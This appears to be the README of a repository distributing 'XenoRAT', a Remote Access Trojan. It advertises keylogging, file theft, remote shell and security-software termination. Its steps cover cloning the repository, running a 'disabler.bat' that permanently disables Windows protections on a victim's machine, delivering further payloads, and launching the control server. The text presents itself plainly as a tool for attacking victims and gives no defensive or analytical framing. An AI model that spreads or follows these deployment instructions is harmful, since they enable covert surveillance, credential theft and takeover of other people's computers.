## üîç Overview
XenoRAT is a sophisticated Remote Access Trojan (RAT) used by cybercriminals and advanced persistent threat (APT) groups to infiltrate and control target systems. Once deployed on an infected machine, XenoRAT grants the attacker full remote control, enabling them to conduct a wide range of malicious activities without the knowledge or consent of the user. Typically, XenoRAT is employed for espionage, data theft, and surveillance, making it a highly dangerous tool for cybercriminals seeking to exfiltrate sensitive information or disrupt organizational operations.

## ‚ú® Features
- üîí **Secure Encrypted Communications**: XenoRAT employs robust encryption protocols to secure the communication between the compromised system and the attacker's command-and-control (C2) server, ensuring stealthy and secure remote access.
- üñ•Ô∏è **Remote Desktop Control**: Attackers can take full control of the infected system‚Äôs desktop, allowing them to operate the device as though they were physically present, without detection.
- üìÅ **File System Management**: XenoRAT enables attackers to browse, upload, download, and manipulate files on the victim‚Äôs system, facilitating data theft or the deployment of additional malicious payloads.
- üîÑ **Process Management**: The malware provides the ability to monitor and control running processes on the infected system, including terminating security software or executing malicious processes.
- üìä **System Monitoring**: XenoRAT allows real-time monitoring of system activity, gathering critical data such as hardware specifications, running applications, and network activity to help attackers adjust their tactics.
- üõ†Ô∏è **Remote Shell Access**: Attackers can gain command-line access to the system, enabling them to execute arbitrary commands and scripts, further compromising the target‚Äôs security.
- üìù **Keylog Management**: XenoRAT can log keystrokes on the infected machine, allowing attackers to capture sensitive information like passwords, messages, and other confidential data.
- üîå **Plugin Support**: The malware supports modular plugins, enabling the attacker to add new capabilities to the RAT, such as additional surveillance tools, backdoors, or advanced exfiltration methods.
- üåê **Cross-Platform Compatibility**: XenoRAT is designed to work across a wide range of operating systems, including Windows, macOS, and Linux, making it a versatile tool for attackers targeting diverse environments.

## üöÄ Installation

1.  Clone the repository into your desired directory:
    ```bash
    git clone https://github.com/jcrvnx/XenoRAT.git
    ```

2.  After cloning, navigate into the XenoRAT directory using your command line interface (like Git Bash, Command Prompt, or PowerShell):
    ```bash
    cd XenoRAT
    ```

3. Run `disabler.bat` as **Administrator** to disable Windows security measures:

   * **For the attacker's machine:** Manually disable real-time protection to avoid detection during compilation.
   * **For the target machine:** Required to bypass security protections on the victim's system.

   ```bash
   # Right-click disabler.bat and select "Run as administrator"
   disabler.bat

   ```
## Purpose
This script (`Disabler.bat`) is designed to **permanently disable** security measures (including real-time protection) on a target Windows machine, allowing further payload deployment.

---

## Attacker Preparation
Before operation, ensure **your own machine** has:
1. Real-time protection **manually disabled**
2. Security software temporarily turned off  

*Failure to do this may result in your system quarantining the malicious files during development/transfer.*

---

## Deployment Instructions (Victim's Machine)
1. **First Execution**  
   Run `Disabler.bat` on the victim's system to:  
   - This will automatically **erase**, **disable** and **bypass** the security measures and other protections **PERMANENTLY**.  

2. **Payload Delivery**  
   Only after successful execution of `Disabler.bat` should you:  
   - Transfer/execute additional malicious files  
   - Begin further exploitation
   - Then you can able to delete the malicious file as it was being injected the victims computer.

---

4.  The script will require a system reboot to apply the changes. Allow your system to restart.

5.  After the system reboots, navigate back to the XenoRAT directory and run the server executable:
    ```bash
    # Double-click xeno-rat-server.exe or run it from the command line
    xeno rat server.exe
    ```
6.  Done. Enjoy the show.
